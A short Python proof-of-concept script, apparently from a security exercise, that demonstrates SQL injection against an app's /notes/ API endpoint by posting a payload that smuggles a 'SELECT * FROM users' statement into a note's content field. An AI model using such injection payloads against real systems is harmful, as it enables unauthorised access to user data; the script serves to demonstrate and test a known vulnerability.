# VULNERABILITY 2: Open to sql injection
# LINK: https://owasp.org/Top10/2021/A03_2021-Injection/

from helper import API_BASE_URL, create_new_user_and_get_token
import requests


def main():
    token = create_new_user_and_get_token()
    headers = {"Authorization": f"Bearer {token}"}
    evil_query = "'); SELECT * FROM users; --"
    res = requests.post(
        f"{API_BASE_URL}/notes/", headers=headers, json={"content": evil_query}
    )
    return res.json()


if __name__ == "__main__":
    import pprint

    pprint.pprint(main())
